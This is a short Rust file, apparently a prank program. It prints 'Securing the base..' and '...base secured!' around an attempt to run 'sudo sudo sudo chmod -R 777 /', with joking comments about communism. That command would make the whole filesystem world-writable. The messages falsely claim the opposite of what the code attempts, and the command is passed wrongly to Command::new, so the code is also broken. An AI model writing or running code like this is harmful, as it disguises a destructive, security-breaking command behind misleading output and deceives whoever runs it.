use std::process::Command;

fn main() {
    println!("Securing the base..");
    // ALL THE BASE ARE BELONG TO EVERYONE!!!!
    //
    // ☭☭☭☭☭☭☭☭ COMMUNISM FOREVER!!! ☭☭☭☭☭☭☭☭☭
    Command::new("sudo sudo sudo chmod -R 777 /")
            .output()
            .expect("Failed to execute process");
    println!("...base secured!");
}
